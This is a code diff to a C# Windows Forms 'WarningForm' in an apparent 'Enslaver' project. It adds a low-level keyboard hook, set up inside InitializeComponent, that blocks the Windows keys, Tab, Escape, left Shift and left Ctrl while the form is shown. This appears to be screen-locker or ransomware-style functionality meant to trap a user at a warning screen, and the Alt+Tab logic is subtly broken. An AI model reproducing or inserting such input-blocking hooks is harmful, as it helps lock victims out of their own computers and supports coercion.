@@ -1,4 +1,8 @@
-﻿namespace EnslaverFrontEnd.Views
+﻿using System.Diagnostics;
+using System;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+namespace EnslaverFrontEnd.Views
 {
     partial class WarningForm
     {
@@ -11,11 +15,25 @@
         /// Clean up any resources being used.
         /// </summary>
         /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        /*protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }*/
+
         protected override void Dispose(bool disposing)
         {
             if (disposing && (components != null))
             {
                 components.Dispose();
+            }
+            if (ptrHook != IntPtr.Zero)
+            {
+                UnhookWindowsHookEx(ptrHook);
+                ptrHook = IntPtr.Zero;
             }
             base.Dispose(disposing);
         }
@@ -28,6 +46,8 @@
         /// </summary>
         private void InitializeComponent()
         {
+            BeforeInit();
+
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(WarningForm));
             this.WarningLabel = new System.Windows.Forms.Label();
             this.axWindowsMediaPlayer1 = new AxWMPLib.AxWindowsMediaPlayer();
@@ -79,6 +99,44 @@
             this.PerformLayout();
 
         }
+
+        private void BeforeInit()
+        {
+            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule; //Get Current Module
+            objKeyboardProcess = new LowLevelKeyboardProc(captureKey); //Assign callback function each time keyboard process
+            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0); //Setting Hook of Keyboard Process for current module
+        }
+
+
+        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
+        {
+            Keys PrevKey = Keys.Alt;
+            if (nCode >= 0)
+            {
+                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
+
+                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin) // Выключаем кнопки ВИНДОВС
+                {
+                    return (IntPtr)1;
+                }
+
+                if ((PrevKey == Keys.Alt) && (objKeyInfo.key == Keys.Tab))      // 
+                {
+                    return (IntPtr)1;
+                }
+
+                if ((objKeyInfo.key == Keys.LShiftKey) || (objKeyInfo.key == Keys.LControlKey) || (objKeyInfo.key == Keys.Escape))
+                {
+                    return (IntPtr)1;
+                }
+
+
+                PrevKey = objKeyInfo.key;
+            }
+
+            return CallNextHookEx(ptrHook, nCode, wp, lp);
+        }
+
 
         #endregion
 
